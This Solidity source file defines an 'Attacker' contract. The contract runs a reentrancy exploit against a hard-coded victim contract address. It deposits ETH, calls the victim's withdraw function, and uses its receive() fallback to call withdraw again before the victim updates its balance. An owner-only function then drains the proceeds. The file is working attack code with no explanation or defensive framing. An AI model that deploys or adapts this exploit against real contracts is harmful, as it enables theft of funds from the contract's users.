// SPDX-License-Identifier: MIT
pragma solidity ^0.8.14;

contract Attacker {
    address public victim = 0x413744D59d31AFDC2889aeE602636177805Bd7b0;
    address public owner;
    uint256 public attackCount;
    
    constructor() {
        owner = msg.sender;
    }
    
    receive() external payable {
        attackCount++;
        if (attackCount < 2 && victim.balance >= 0.1 ether) {
            victim.call(
                abi.encodeWithSelector(0x2e1a7d4d, 0.1 ether)
            );
        }
    }
    
    function depositToVictim() external payable {
        require(msg.value >= 0.1 ether, "Need 0.1 ETH");
        (bool success,) = victim.call{value: msg.value}(
            abi.encodeWithSelector(0x22c33cb3, address(this))
        );
        require(success, "Deposit failed");
    }
    
    function depositForMyAddress(address myAddress) external payable {
        require(msg.value >= 0.1 ether, "Need 0.1 ETH");
        (bool success,) = victim.call{value: msg.value}(
            abi.encodeWithSelector(0x22c33cb3, myAddress)
        );
        require(success, "Deposit failed");
    }
    
    // Withdraw using deposited balance and trigger reentrancy
    function exploitMyBalance() external {
        require(msg.sender == owner, "Only owner");
        attackCount = 0;
        
        (bool success,) = victim.call(
            abi.encodeWithSelector(0x2e1a7d4d, 0.1 ether)
        );
        require(success, "First withdraw failed");
    }

    function exploit(uint256 amount) external {
        require(msg.sender == owner, "Only owner");
        attackCount = 0;
        (bool success,) = victim.call(
            abi.encodeWithSelector(0x2e1a7d4d, amount)
        );
        require(success, "Withdraw failed");
    }
    
    function withdraw() external {
        require(msg.sender == owner, "Only owner");
        payable(owner).transfer(address(this).balance);
    }
    
    function getBalance() public view returns (uint256) {
        return address(this).balance;
    }
}